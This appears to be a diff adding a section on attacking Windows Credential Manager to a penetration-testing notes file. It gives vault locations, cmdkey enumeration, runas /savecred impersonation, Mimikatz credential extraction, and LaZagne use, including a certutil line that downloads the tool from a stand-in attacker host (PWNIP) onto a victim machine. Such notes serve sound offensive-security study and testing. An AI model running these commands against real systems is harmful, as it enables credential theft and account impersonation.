@@ -266,3 +266,79 @@ Based on my personal experience in real-world pentest engagements, we can enable
 sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
 ```
 
+# Attacking Windows Credential Manager
+
+Credentials are stored in special encrypted folders on the computer under the user and system profiles ([MITRE ATT&CK](https://attack.mitre.org/techniques/T1555/004/)):
+
+- `%UserProfile%\AppData\Local\Microsoft\Vault\`
+- `%UserProfile%\AppData\Local\Microsoft\Credentials\`
+- `%UserProfile%\AppData\Roaming\Microsoft\Vault\`
+- `%ProgramData%\Microsoft\Vault\`
+- `%SystemRoot%\System32\config\systemprofile\AppData\Roaming\Microsoft\Vault\`
+
+Each vault folder contains `Policy.vpol` file with AES keys that is protected by DPAPI. These AES keys are used to encrypt the credentials. Newer versions of Windows make use of `Credential Guard` to further protect the DPAPI master keys by storing them in secured memory enclaves ([Virtualization-based Security](https://learn.microsoft.com/en-us/windows-hardware/design/device-experiences/oem-vbs)).
+
+|Name|Description|
+|---|---|
+|Web Credentials|Credentials associated with websites and online accounts. This locker is used by Internet Explorer and legacy versions of Microsoft Edge.|
+|Windows Credentials|Used to store login tokens for various services such as OneDrive, and credentials related to domain users, local network resources, services, and shared directories.|
+
+It is possible to export **Windows Vaults** to `.crd` file via Control Panel or the following command:
+
+```powershell
+rundll32 keymgr.dll,KRShowKeyMgr
+```
+
+Backups created are encrypted with a user supplied password and can be imported to other windows hosts.
+
+## Enumerating credentials with cmdkey
+
+Enumerate credentials in the current user profile using `cmdkey`
+
+```powershell
+cmdkey /list
+```
+
+Stored credentials are listed with the following format:
+
+|Key|Value|
+|---|---|
+|Target|The resource or account name the credential is for. This could be a computer, domain name, or a special identifier.|
+|Type|The kind of credential. Common types are `Generic` for general credentials, and `Domain Password` for domain user logons.|
+|User|The user account associated with the credential.|
+|Persistence|Some credentials indicate whether a credential is saved persistently on the computer; credentials marked with `Local machine persistence` survive reboots.|
+**Abuse Example:**
+
+```txt
+Target: Domain:interactive=SRV01\mcharles 
+Type: Domain Password 
+User: SRV01\mcharles
+```
+
+**Interactive** means credentials can be used for interactive logon. When we see this kind of credentials, we can use `runas` to impersonate the user with stored creds:
+
+```powershell
+runas /savecred /user:SRV01\mcharles cmd
+```
+
+## Extracting credentials with Mimikatz
+
+```powershell
+privilege::debug
+sekurlsa::credman
+```
+
+```ad-resources
+Some other tools which may be used to enumerate and extract stored credentials included [SharpDPAPI](https://github.com/GhostPack/SharpDPAPI), [LaZagne](https://github.com/AlessandroZ/LaZagne), and [DonPAPI](https://github.com/login-securite/DonPAPI).
+```
+
+**LaZagne Usage Example:**
+
+```powershell
+wget -q https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.7/LaZagne.exe -O lazagne.exe
+
+certutil -urlcache -split -f "http://PWNIP:8000/lazagne.exe" C:\Windows\Temp\lazagne.exe
+
+C:\Windows\Temp\lazagne.exe all
+```
+
